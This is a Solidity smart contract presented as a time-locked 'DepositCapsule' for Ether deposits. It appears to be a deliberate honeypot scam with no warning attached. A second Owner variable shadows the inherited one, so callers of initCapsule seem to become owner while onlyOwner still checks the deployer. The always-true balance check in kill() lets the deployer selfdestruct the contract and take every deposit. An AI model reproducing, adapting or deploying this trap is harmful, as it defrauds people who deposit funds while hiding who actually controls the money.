/*
   Copyright (C) 2017  The Halo Platform by Scott Morrison
                https://www.haloplatform.tech/

   This is free software and you are welcome to redistribute it under certain
   conditions. ABSOLUTELY NO WARRANTY; for details visit:
   https://www.gnu.org/licenses/gpl-2.0.html
*/
pragma solidity ^0.4.23;

contract Ownable {
    address public Owner;
    constructor() public { Owner = msg.sender; }
    modifier onlyOwner() { if (Owner == msg.sender) { _; } }
    
    function transferOwner(address _owner) public onlyOwner {
        address previousOwner;
        if (address(this).balance == 0) {
            previousOwner = Owner;
            Owner = _owner;
            emit NewOwner(previousOwner, Owner);
        }
    }
    event NewOwner(address indexed oldOwner, address indexed newOwner);
}

contract DepositCapsule is Ownable {
    address public Owner;
    mapping (address=>uint) public deposits;
    uint public openDate;
    uint public minimum;
    
    function initCapsule(uint openOnDate) public {
        Owner = msg.sender;
        openDate = openOnDate;
        minimum = 0.5 ether;
        emit Initialized(Owner, openOnDate);
    }
    event Initialized(address indexed owner, uint openOn);
    
    function() public payable {  }
    
    function deposit() public payable {
        if (msg.value >= minimum) {
            deposits[msg.sender] += msg.value;
            emit Deposit(msg.sender, msg.value);
        } else revert();
    }
    event Deposit(address indexed depositor, uint amount);

    function withdraw(uint amount) public onlyOwner {
        if (now >= openDate) {
            uint max = deposits[msg.sender];
            if (amount <= max && max > 0) {
                if (msg.sender.send(amount))
                    emit Withdrawal(msg.sender, amount);
            }
        }
    }
    event Withdrawal(address indexed withdrawer, uint amount);
    
    function kill() public onlyOwner {
        if (address(this).balance >= 0)
            selfdestruct(msg.sender);
	}
}